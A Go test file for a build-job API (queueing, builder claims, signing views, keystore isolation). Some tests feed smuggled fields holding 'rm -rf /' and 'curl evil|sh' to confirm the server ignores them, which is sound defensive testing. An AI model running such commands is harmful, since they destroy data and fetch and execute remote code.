package api

import (
	"context"
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/Helix2010/RN-Server/internal/config"
	"github.com/gin-gonic/gin"
)

func TestClampLogTailKeepsTheEndAndBoundsTheRow(t *testing.T) {
	lines := make([]string, buildJobLogTailMax+50)
	for i := range lines {
		lines[i] = "line-" + string(rune('a'+i%26))
	}
	lines[len(lines)-1] = "the failure is always at the end"

	var kept []string
	if err := json.Unmarshal(clampLogTail(lines), &kept); err != nil {
		t.Fatal(err)
	}
	if len(kept) != buildJobLogTailMax {
		t.Fatalf("kept %d lines, want %d", len(kept), buildJobLogTailMax)
	}
	// 留头不留尾的话，这一列存的就永远是构建的开场白，而失败原因在最后
	if kept[len(kept)-1] != "the failure is always at the end" {
		t.Fatalf("the last line was dropped: %q", kept[len(kept)-1])
	}

	// 一行也不能无限长：这张表是管理端列表要扫的
	long := clampLogTail([]string{strings.Repeat("x", 9000)})
	var single []string
	if err := json.Unmarshal(long, &single); err != nil {
		t.Fatal(err)
	}
	if len(single[0]) != 2000 {
		t.Fatalf("a single line was stored at %d bytes", len(single[0]))
	}

	// nil 要落成 []，不是 JSON null——列上有 NOT NULL 语义的读法在前端
	var empty []string
	if err := json.Unmarshal(clampLogTail(nil), &empty); err != nil {
		t.Fatal(err)
	}
	if empty == nil || len(empty) != 0 {
		t.Fatalf("nil log tail became %v", empty)
	}
}

func TestIsHexRejectsWhatIsNotADigest(t *testing.T) {
	if !isHex("abc123", 6, 6) || !isHex(strings.Repeat("f", 64), 64, 64) {
		t.Fatal("valid lowercase hex was rejected")
	}
	for name, value := range map[string]string{
		"uppercase":  strings.Repeat("F", 64),
		"too short":  strings.Repeat("a", 63),
		"not hex":    strings.Repeat("z", 64),
		"empty":      "",
		"whitespace": strings.Repeat(" ", 64),
	} {
		if isHex(value, 64, 64) {
			t.Fatalf("%s was accepted as a digest", name)
		}
	}
}

func TestCreateBuildJobRejectsInvalidBodiesBeforeTouchingTheDatabase(t *testing.T) {
	gin.SetMode(gin.TestMode)
	// db 为 nil：任何走到数据库的路径都会 panic
	//
	// gitRef 不在这些用例里：它已经不由请求决定了（固定 main），所以"没填分支"不再
	// 是一种非法输入。能选分支就等于能从任意分支出一个用生产签名密钥签的包。
	s := &server{cfg: config.Config{Environment: "production"}}
	for name, payload := range map[string]string{
		"not confirmed":   `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship signing","confirm":false}`,
		"short reason":    `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"x","confirm":true}`,
		"bad platform":    `{"platform":"windows","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship signing","confirm":true}`,
		"not semver":      `{"platform":"android","gitRef":"main","version":"1.3","buildNumber":34,"reason":"ship signing","confirm":true}`,
		"zero build":      `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":0,"reason":"ship signing","confirm":true}`,
		"negative build":  `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":-1,"reason":"ship signing","confirm":true}`,
		"not json":        `{`,
		"no command here": `{"platform":"android","gitRef":"main","version":"1.3.8","buildNumber":34,"reason":"ship","confirm":true,"command":"rm -rf /"}`,
	} {
		recorder := httptest.NewRecorder()
		c, _ := gin.CreateTestContext(recorder)
		c.Request = httptest.NewRequest("POST", "/v1/admin/builds", strings.NewReader(payload))
		c.Request.Header.Set("Content-Type", "application/json")
		s.createBuildJob(c)
		if recorder.Code != http.StatusBadRequest {
			t.Fatalf("%s: status %d body %s", name, recorder.Code, recorder.Body.String())
		}
	}
}

// 任务里没有命令字段。多送一个 command 过来必须被忽略而不是被执行——这是整个
// 设计的前提：服务端不在打包机上执行任意命令。
func TestBuildJobCreateCarriesNoCommandField(t *testing.T) {
	var body buildJobCreate
	if err := json.Unmarshal([]byte(`{"platform":"android","command":"rm -rf /","script":"curl evil|sh"}`), &body); err != nil {
		t.Fatal(err)
	}
	raw, err := json.Marshal(body)
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{"command", "script", "rm -rf"} {
		if strings.Contains(string(raw), forbidden) {
			t.Fatalf("the request struct round-trips %q: %s", forbidden, raw)
		}
	}
}

func TestFailBuildJobNeedsAReason(t *testing.T) {
	gin.SetMode(gin.TestMode)
	s := &server{cfg: config.Config{Environment: "production"}}
	recorder := httptest.NewRecorder()
	c, _ := gin.CreateTestContext(recorder)
	c.Params = gin.Params{{Key: "id", Value: "bld_test"}}
	c.Request = httptest.NewRequest("POST", "/v1/build-agent/jobs/bld_test/fail", strings.NewReader(`{"failureReason":"  "}`))
	c.Request.Header.Set("Content-Type", "application/json")
	c.Request.Header.Set(buildAttemptHeader, "1")
	s.failBuildJob(c)
	// 一条没有原因的失败等于没有记录：管理端看到 failed 却不知道为什么
	if recorder.Code != http.StatusBadRequest {
		t.Fatalf("status %d body %s", recorder.Code, recorder.Body.String())
	}
}

// ---- 需要真实 MySQL 的用例（RN_TEST_MYSQL_DSN 未设置时整组跳过）----

// seedBuildTenant 建一条租户行。认领接口是**跨租户**的（构建机本来就跨租户工作），
// 所以每个用例还要把别人的任务清掉，否则拿到的是上一个用例留下的那条。
func seedBuildTenant(t *testing.T, s *server, tenant string) string {
	t.Helper()
	slug := "bld-" + tenant
	if _, err := s.db.Exec(`INSERT INTO tenants(id,slug,status,start_date,expiry_date,deleted,created_at,updated_at) VALUES(?,?,1,CURDATE(),DATE_ADD(CURDATE(), INTERVAL 1 YEAR),0,UTC_TIMESTAMP(3),UTC_TIMESTAMP(3))`, tenant, slug); err != nil {
		t.Fatalf("insert tenant: %v", err)
	}
	if _, err := s.db.Exec(`DELETE FROM build_jobs WHERE tenant_id<>?`, tenant); err != nil {
		t.Fatalf("clear other queues: %v", err)
	}
	return slug
}

// seedBuildIdentity 补上"这个租户能合成 tenant.json"所缺的那部分：应用身份。
//
// 租户行由 seedBuildTenant 插；这里只种 tenantManifestFor 要求的最小集合，不是全集：
// google-services 只在已配置时才校验，所以不种；图标底色有默认值。签名指纹用一个
// 没有作废的值——作废的旧指纹在登记与入库时永久拒绝（retiredAndroidSigners）。
func seedBuildIdentity(t *testing.T, db *sql.DB, tenant, slug string) {
	t.Helper()
	seedBuildIdentityWith(t, db, tenant, slug, "com.seeded.app", "2b5d9fb446e2f4c8e1aa464a02b14248a265ea9c554f83eb01ec94886329e695")
}

func TestDBBuildJobQueueEnforcesMonotonicBuildNumbers(t *testing.T) {
	f := newGateFixture(t, 1)
	create := func(version string, buildNumber int) *httptest.ResponseRecorder {
		c, recorder := testContext(t, f.tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": version,
			"buildNumber": buildNumber, "reason": "ship ota signing", "confirm": true,
		})
		f.s.createBuildJob(c)
		return recorder
	}
	first := create("1.3.8", 34)
	if first.Code != http.StatusCreated {
		t.Fatalf("first job: %d %s", first.Code, first.Body.String())
	}
	// 响应里的 kind 必须是 apk。管理端按 apk|ota 校验这份响应，空串会让一次成功的排队
	// 显示成"排队失败"——用户一重试就真的多排一个包（2026-09-14 anyfun 1.3.15 就是这样）。
	created := decodeBody(t, first)
	if created["kind"] != "apk" || created["status"] != "queued" || created["attempt"] != float64(0) {
		t.Fatalf("create response must say kind=apk status=queued attempt=0, got %v", created)
	}
	// 同号必须被拒。两个人各排一个 build 34，装到设备上哪个赢取决于谁后装
	if recorder := create("1.3.9", 34); recorder.Code != http.StatusConflict || problemCode(t, recorder) != "BUILD_NUMBER_NOT_INCREASING" {
		t.Fatalf("duplicate build number: %d %s", recorder.Code, recorder.Body.String())
	}
	if recorder := create("1.3.9", 33); recorder.Code != http.StatusConflict {
		t.Fatalf("a lower build number was accepted: %d", recorder.Code)
	}
	if code := create("1.3.9", 35).Code; code != http.StatusCreated {
		t.Fatalf("a higher build number was refused: %d", code)
	}
}

// 构建失败 → 改一行 → 用同一个版本号重来，是最常见的那条路径。第一版把唯一键
// 直接建在 build_number 上，把它堵死了：失败的构建没有产物，那个号根本没被用掉。
func TestDBBuildJobNumberIsFreeAgainAfterAFailure(t *testing.T) {
	f := newGateFixture(t, 4)
	queue := func(buildNumber int) *httptest.ResponseRecorder {
		c, recorder := testContext(t, f.tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": "3.0.0",
			"buildNumber": buildNumber, "reason": "retry after failure", "confirm": true,
		})
		f.s.createBuildJob(c)
		return recorder
	}
	if code := queue(300).Code; code != http.StatusCreated {
		t.Fatalf("first attempt: %d", code)
	}
	job := f.claimBuild()
	id := job["id"].(string)
	if r := f.do(http.MethodPost, "/v1/build-agent/jobs/"+id+"/fail", f.builder.Token, attemptHeaders(buildAttemptHeader, 1),
		map[string]any{"failureReason": "gradle blew up", "commitSha": "", "logTail": []string{}}); r.Code != http.StatusNoContent {
		t.Fatalf("fail: %d %s", r.Code, r.Body.String())
	}
	if recorder := queue(300); recorder.Code != http.StatusCreated {
		t.Fatalf("the same build number was refused after a failure: %d %s", recorder.Code, recorder.Body.String())
	}
	// 但同时排两个还是不行：唯一索引只放过 failed/canceled
	if recorder := queue(300); recorder.Code != http.StatusConflict {
		t.Fatalf("two live jobs got the same build number: %d", recorder.Code)
	}
}

// 两台构建机各领一条，不会领到同一条；每台同时只派一条。
func TestDBBuildJobClaimHandsEachJobToExactlyOneBuilder(t *testing.T) {
	f := newGateFixture(t, 2)
	second := newGateMachine(t, machineRoleBuilder, "builder-two-"+uniqueSuffix())
	f.writeMachines(f.builder.record(""), second.record(""), f.primary.record(signerRolePrimary), f.standby.record(signerRoleStandby))
	// 两条任务的版本号也必须不同：同一个版本号的第二个包在入库那一刻必然被拒
	f.queueBuild("1.3.8", 101)
	f.queueBuild("1.3.9", 102)

	claim := func(machine gateMachine) *httptest.ResponseRecorder {
		return f.do(http.MethodPost, "/v1/build-agent/claim", machine.Token, nil, map[string]any{"platforms": []string{"android"}, "kinds": []string{"apk"}})
	}
	firstRecorder := claim(f.builder)
	if firstRecorder.Code != http.StatusOK {
		t.Fatalf("first claim: %d %s", firstRecorder.Code, firstRecorder.Body.String())
	}
	first := decodeBody(t, firstRecorder)
	// 同一台机器手上还有一条时不再派：回 409 并告诉它是哪一条、第几次认领
	again := claim(f.builder)
	if again.Code != http.StatusConflict || problemCode(t, again) != "BUILDER_HAS_ACTIVE_JOB" {
		t.Fatalf("a builder with an active job got another: %d %s", again.Code, again.Body.String())
	}
	if body := decodeBody(t, again); body["jobId"] != first["id"] || body["attempt"] != float64(1) {
		t.Fatalf("BUILDER_HAS_ACTIVE_JOB must name the active job: %v", body)
	}
	secondRecorder := claim(second)
	if secondRecorder.Code != http.StatusOK {
		t.Fatalf("second builder claim: %d %s", secondRecorder.Code, secondRecorder.Body.String())
	}
	other := decodeBody(t, secondRecorder)
	if first["id"] == other["id"] {
		t.Fatalf("two builders claimed the same job: %v", first["id"])
	}
	// 先排队的先出去：build 101 在 102 之前
	if first["buildNumber"].(float64) != 101 || first["attempt"] != float64(1) {
		t.Fatalf("the queue is not FIFO or the attempt is wrong: %v", first)
	}
	// claimed_by 是登记里的名称，不是自报的
	if first["status"] != "claimed" || first["claimedBy"] != f.builder.Name || first["claimedMachineId"] != f.builder.ID {
		t.Fatalf("claim did not stick: %v", first)
	}
	if _, present := first["otaCertificatePem"]; !present {
		t.Fatal("the claim response must carry the tenant OTA certificate")
	}
	if first["tenantSlug"] != f.slug {
		t.Fatalf("the builder cannot tell which tenant to build: %v", first["tenantSlug"])
	}
}

// 构建机领取结果里没有任何签名密钥材料：没有密文、没有别名、没有私钥。
func TestDBBuilderClaimCarriesNoKeystoreMaterial(t *testing.T) {
	f := newGateFixture(t, 5)
	f.queueBuild("2.0.0", 200)
	recorder := f.do(http.MethodPost, "/v1/build-agent/claim", f.builder.Token, nil, map[string]any{"platforms": []string{"android"}, "kinds": []string{"apk"}})
	if recorder.Code != http.StatusOK {
		t.Fatalf("claim: %d %s", recorder.Code, recorder.Body.String())
	}
	raw := recorder.Body.String()
	var payload map[string]any
	if err := json.Unmarshal(recorder.Body.Bytes(), &payload); err != nil {
		t.Fatal(err)
	}
	for _, key := range []string{"sealedKeystore", "keyAlias", "keystore", "box", "boxes", "sealed", "provenance"} {
		if _, present := payload[key]; present {
			t.Fatalf("the builder claim carries %q", key)
		}
	}
	upload, err := f.s.keystoreUploadFor(f.tenant, mustKeystoreRecord(t, f))
	if err != nil {
		t.Fatal(err)
	}
	for _, box := range upload.Boxes {
		for _, secret := range []string{box.Ciphertext, box.EphemeralPublicKey, box.Nonce} {
			if strings.Contains(raw, secret) {
				t.Fatal("the builder claim contains keystore ciphertext")
			}
		}
	}
	for _, forbidden := range []string{"PRIVATE KEY", "recipientSha256", "\"ct\"", "\"epk\""} {
		if strings.Contains(raw, forbidden) {
			t.Fatalf("the builder claim contains %s", forbidden)
		}
	}
}

func mustKeystoreRecord(t *testing.T, f *gateFixture) buildKeystoreRecord {
	t.Helper()
	state, err := f.s.buildKeystoreStateFor(context.Background(), f.db, f.tenant)
	if err != nil || !state.configured() {
		t.Fatalf("keystore state: %v %+v", err, state)
	}
	return state.Record
}

// 排队这一刻就要挡下"版本号没涨"。入库那一侧是双条件（版本和 build 号都要大于上一
// 条发布），这里只看 build 号的话，用同一个版本号排一个更大的 build 号能一路走到
// 签名完成，在入库的那一刻才被拒。
func TestDBBuildJobQueueRequiresAnIncreasingVersion(t *testing.T) {
	f := newGateFixture(t, 9)
	now := time.Now().UTC()
	if _, err := f.db.Exec(`INSERT INTO app_releases(id,tenant_id,platform,version,build_number,runtime_version,status,release_notes,file_metadata,file_name,content_type,object_key,expected_size,created_by,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`,
		"rel_"+uniqueSuffix(), f.tenant, "android", "1.3.12", 41, "1.3.12", "active", "{}", `{"packageName":"`+f.packageName+`","signerSha256":"`+f.apkSigner.sha256()+`"}`,
		"anyfun-1.3.12-build41-release.apk", "application/vnd.android.package-archive",
		"tenants/"+f.tenant+"/releases/app.apk", 1, "tester", now, now); err != nil {
		t.Fatalf("插入已有发布: %v", err)
	}
	queue := func(version string, buildNumber int) (int, map[string]any) {
		c, recorder := testContext(t, f.tenant, "POST", "/v1/admin/builds", map[string]any{
			"platform": "android", "gitRef": "main", "version": version,
			"buildNumber": buildNumber, "reason": "测试版本递增闸", "confirm": true,
		})
		f.s.createBuildJob(c)
		return recorder.Code, decodeBody(t, recorder)
	}
	if code, out := queue("1.3.12", 42); code != http.StatusConflict || out["code"] != "BUILD_VERSION_NOT_INCREASING" {
		t.Fatalf("版本号没涨却排进了队列：%d %v", code, out)
	}
	if code, out := queue("1.3.11", 43); code != http.StatusConflict || out["code"] != "BUILD_VERSION_NOT_INCREASING" {
		t.Fatalf("版本号倒退却排进了队列：%d %v", code, out)
	}
	if code, out := queue("1.3.13", 42); code != http.StatusCreated {
		t.Fatalf("版本和 build 号都涨了却被拒：%d %v", code, out)
	}
}

// 第一个包和后续包的默认值。空库给 1.0.0/1，有数据就在最高的那一组上各进一位。
func TestBuildFloorNextDefaults(t *testing.T) {
	for _, tc := range []struct {
		name        string
		floor       buildFloor
		wantVersion string
		wantBuild   int
	}{
		{"空库", buildFloor{}, "1.0.0", 1},
		{"有发布", buildFloor{Version: "1.3.13", BuildNumber: 43}, "1.3.14", 44},
		// 9 → 10 而不是字符串序上的 1.3.9 > 1.3.10
		{"跨十位", buildFloor{Version: "1.3.9", BuildNumber: 9}, "1.3.10", 10},
		{"大版本", buildFloor{Version: "2.0.0", BuildNumber: 100}, "2.0.1", 101},
		// 版本号是脏的也要给出一个能用的默认值，而不是把坏值原样抛回页面
		{"版本号不合法", buildFloor{Version: "latest", BuildNumber: 7}, "1.0.0", 8},
	} {
		t.Run(tc.name, func(t *testing.T) {
			version, number := tc.floor.next()
			if version != tc.wantVersion || number != tc.wantBuild {
				t.Fatalf("默认值 = %s/%d，想要 %s/%d", version, number, tc.wantVersion, tc.wantBuild)
			}
		})
	}
}

// 下限必须把**在途**的任务算进去，含待签名与签名中。只看发布表的话，签名期间再排
// 一个任务会拿到同一个版本号，签完那一刻才在入库时被拒。
func TestDBBuildFloorCountsJobsInFlightNotJustReleases(t *testing.T) {
	f := newGateFixture(t, 10)
	floor, err := f.s.buildFloorFor(context.Background(), f.tenant, "android")
	if err != nil {
		t.Fatal(err)
	}
	if version, number := floor.next(); version != "1.0.0" || number != 1 {
		t.Fatalf("空库的第一个包应当是 1.0.0/1，得到 %s/%d", version, number)
	}
	id := f.queueBuild("1.0.0", 1)
	for _, status := range []string{jobQueued, jobBuilt, jobSigning} {
		f.setJob(id, "status=?", status)
		floor, err = f.s.buildFloorFor(context.Background(), f.tenant, "android")
		if err != nil {
			t.Fatal(err)
		}
		if version, number := floor.next(); version != "1.0.1" || number != 2 {
			t.Fatalf("%s 的任务没被算进下限：下一个给了 %s/%d", status, version, number)
		}
	}
	f.setJob(id, "status='failed'")
	floor, err = f.s.buildFloorFor(context.Background(), f.tenant, "android")
	if err != nil {
		t.Fatal(err)
	}
	if version, number := floor.next(); version != "1.0.0" || number != 1 {
		t.Fatalf("失败的任务不占号，下一个应当还是 1.0.0/1，得到 %s/%d", version, number)
	}
}

// 刚排进队列的任务还没有日志，这时 logTail 必须是 []，不能是 null。
func TestBuildJobViewSerialisesEmptyLogTailAsAnArray(t *testing.T) {
	raw, err := json.Marshal(buildJobView(buildJob{ID: "bld_x", Platform: "android", Status: "queued"}))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(raw), `"logTail":[]`) {
		t.Fatalf(`logTail 不是空数组：%s`, raw)
	}
	if !strings.Contains(string(raw), `"releaseNotes":{}`) {
		t.Fatalf(`releaseNotes 不是空对象：%s`, raw)
	}
}

// 视图带上签名闸新增的字段（约定 5.4），而且不带出处与对象键。
func TestBuildJobViewCarriesSigningFields(t *testing.T) {
	job := buildJob{
		ID: "bld_x", Platform: "android", Kind: "apk", Status: jobSigning, Attempt: 2, SignAttempt: 3, SignFailures: 1,
		ClaimedMachineID: sql.NullString{String: "mch_builder", Valid: true}, SigningMachineID: sql.NullString{String: "mch_signer", Valid: true},
		UnsignedSHA256: sql.NullString{String: strings.Repeat("a", 64), Valid: true}, UnsignedSize: sql.NullInt64{Int64: 42, Valid: true},
		UnsignedObjectKey: sql.NullString{String: "tenants/1/build-jobs/bld_x/a2/app-release-unsigned.apk", Valid: true},
		Provenance:        []byte(`{"statement":"c2VjcmV0","signature":"x"}`),
		SignOutcome:       []byte(`{"kind":"deferred","code":"NOT_CONFIRMED","detail":"not yet","machineId":"mch_signer","at":"2026-09-16T00:00:00.000Z"}`),
	}
	view := buildJobView(job)
	for key, want := range map[string]any{
		"attempt": 2, "signAttempt": 3, "signFailures": 1, "claimedMachineId": "mch_builder", "signingMachineId": "mch_signer",
		"unsignedSha256": strings.Repeat("a", 64), "commitSelfReported": true,
	} {
		if view[key] != want {
			t.Fatalf("view[%s] = %#v, want %#v", key, view[key], want)
		}
	}
	// 给租户控制台的视图看不到是哪台机器
	tenantView := tenantJobView(job)
	for _, key := range []string{"claimedBy", "claimedMachineId", "signingMachineId", "signingMachineName"} {
		if value, present := tenantView[key]; present {
			t.Fatalf("tenant view[%s] = %#v, want absent", key, value)
		}
	}
	if _, present := tenantView["signOutcome"].(gin.H)["machineId"]; present {
		t.Fatalf("tenant view signOutcome = %#v", tenantView["signOutcome"])
	}
	outcome, ok := view["signOutcome"].(gin.H)
	if !ok || outcome["kind"] != "deferred" || outcome["code"] != "NOT_CONFIRMED" {
		t.Fatalf("signOutcome = %#v", view["signOutcome"])
	}
	raw, _ := json.Marshal(view)
	for _, forbidden := range []string{"provenance", "c2VjcmV0", "unsigned_object_key", "a2/app-release-unsigned.apk"} {
		if strings.Contains(string(raw), forbidden) {
			t.Fatalf("the job view leaks %s: %s", forbidden, raw)
		}
	}
}

// 认领的回应在路上丢了，任务该**重排**，不该判死。
//
// 2026-09-20 真机上第一条 iOS 任务就是这么没的：认领请求到了服务端、任务派了出去，
// 回应没回到构建机（它那侧 30 秒超时）。七分钟后它再来认领，服务端说"你手上还挂着
// 一条"，它就把这条一行都没跑过的任务判了死。回收定时器遇到同样的局面是重排。
func TestDBAClaimThatNeverReachedTheBuilderIsRequeued(t *testing.T) {
	f := newGateFixture(t, 5)
	f.queueBuild("4.0.0", 400)

	abandon := func(id string, attempt int) *httptest.ResponseRecorder {
		return f.do(http.MethodPost, "/v1/build-agent/jobs/"+id+"/fail", f.builder.Token,
			attemptHeaders(buildAttemptHeader, attempt), map[string]any{
				"failureReason": "认领的回应没回来", "commitSha": "", "logTail": []string{}, "orphaned": true,
			})
	}

	// 前两次交回都该把任务放回队列：同一台机器立刻又能领到它
	for attempt := 1; attempt <= maxBuildAttempts-1; attempt++ {
		job := f.claimBuild()
		id := job["id"].(string)
		if got := int(job["attempt"].(float64)); got != attempt {
			t.Fatalf("attempt %d, want %d", got, attempt)
		}
		if r := abandon(id, attempt); r.Code != http.StatusNoContent {
			t.Fatalf("交回第 %d 次：%d %s", attempt, r.Code, r.Body.String())
		}
	}

	// 第三次用完了次数：这一次该按失败记，否则一条领不动的任务会永远转下去
	job := f.claimBuild()
	id := job["id"].(string)
	if got := int(job["attempt"].(float64)); got != maxBuildAttempts {
		t.Fatalf("attempt %d, want %d", got, maxBuildAttempts)
	}
	if r := abandon(id, maxBuildAttempts); r.Code != http.StatusNoContent {
		t.Fatalf("最后一次交回：%d %s", r.Code, r.Body.String())
	}
	if status := f.jobStatus(id).Status; status != jobFailed {
		t.Fatalf("次数用完之后状态是 %s，该是 failed", status)
	}

	// 不带 orphaned 的普通失败照旧是终态，一次就判死
	f.queueBuild("4.0.1", 401)
	plain := f.claimBuild()
	plainID := plain["id"].(string)
	if r := f.do(http.MethodPost, "/v1/build-agent/jobs/"+plainID+"/fail", f.builder.Token,
		attemptHeaders(buildAttemptHeader, 1), map[string]any{
			"failureReason": "gradle 炸了", "commitSha": "", "logTail": []string{},
		}); r.Code != http.StatusNoContent {
		t.Fatalf("普通失败：%d %s", r.Code, r.Body.String())
	}
	if status := f.jobStatus(plainID).Status; status != jobFailed {
		t.Fatalf("一次真的失败被重排了：%s", status)
	}
}
